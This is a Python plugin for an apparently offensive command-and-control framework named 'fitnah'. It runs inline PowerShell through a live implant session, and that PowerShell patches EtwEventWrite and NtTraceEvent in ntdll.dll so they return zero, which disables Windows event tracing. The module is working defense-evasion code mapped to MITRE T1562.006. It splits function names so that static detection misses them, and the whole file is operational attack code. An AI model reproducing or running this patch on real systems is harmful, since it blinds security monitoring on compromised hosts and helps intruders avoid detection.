"""defense_evasion/etw_patch — inline PS P/Invoke patch of EtwEventWrite in ntdll. MITRE T1562.006"""
from fitnah.sdk import BasePlugin, ModuleResult, mitre


class EtwPatch(BasePlugin):
    NAME        = "etw_patch"
    DESCRIPTION = "Patch EtwEventWrite + NtTraceEvent in ntdll.dll to ret-0 via inline P/Invoke."
    AUTHOR      = "fitnah-team"
    MITRE       = "T1562.006"
    CATEGORY    = "defense_evasion"

    @mitre("T1562.006")
    def run(self, session, params, ctx=None) -> ModuleResult:
        if ctx is None:
            return ModuleResult.err("Requires live session")
        # Fully inline — does NOT call ctx.send() since implant has no keylogger handler
        ps = r"""
$results = @()

$pinvoke = @"
using System;
using System.Runtime.InteropServices;
public class EtwP {
    [DllImport("kernel32")] public static extern IntPtr GetProcAddress(IntPtr h, string n);
    [DllImport("kernel32")] public static extern IntPtr GetModuleHandle(string n);
    [DllImport("kernel32")] public static extern bool VirtualProtect(IntPtr a, UIntPtr s, uint p, out uint o);
}
"@
try { Add-Type $pinvoke -EA Stop } catch {}

# Split strings to avoid static detection
$modName = 'nt' + 'dll'
$patch   = [byte[]](0x31, 0xC0, 0xC3)   # xor eax,eax; ret

foreach ($fnName in @(('Etw' + 'Event' + 'Write'), ('Nt' + 'Trace' + 'Event'))) {
    try {
        $hMod = [EtwP]::GetModuleHandle($modName)
        $addr = [EtwP]::GetProcAddress($hMod, $fnName)
        if ($addr -eq [IntPtr]::Zero) {
            $results += "[-] $fnName: GetProcAddress returned null"
            continue
        }
        $old = [uint32]0
        [EtwP]::VirtualProtect($addr, [UIntPtr]([uint32]$patch.Length), 0x40, [ref]$old) | Out-Null
        [System.Runtime.InteropServices.Marshal]::Copy($patch, 0, $addr, $patch.Length)
        [EtwP]::VirtualProtect($addr, [UIntPtr]([uint32]$patch.Length), $old, [ref]$old) | Out-Null
        $results += "[+] $fnName patched at 0x$($addr.ToString('X16'))"
    } catch {
        $results += "[!] $fnName: $($_.Exception.Message)"
    }
}

$results -join "`n"
"""
        r = ctx.ps(ps)
        if r["status"] != "ok":
            return ModuleResult.err(r["output"])
        return ModuleResult.ok(data=r["output"])
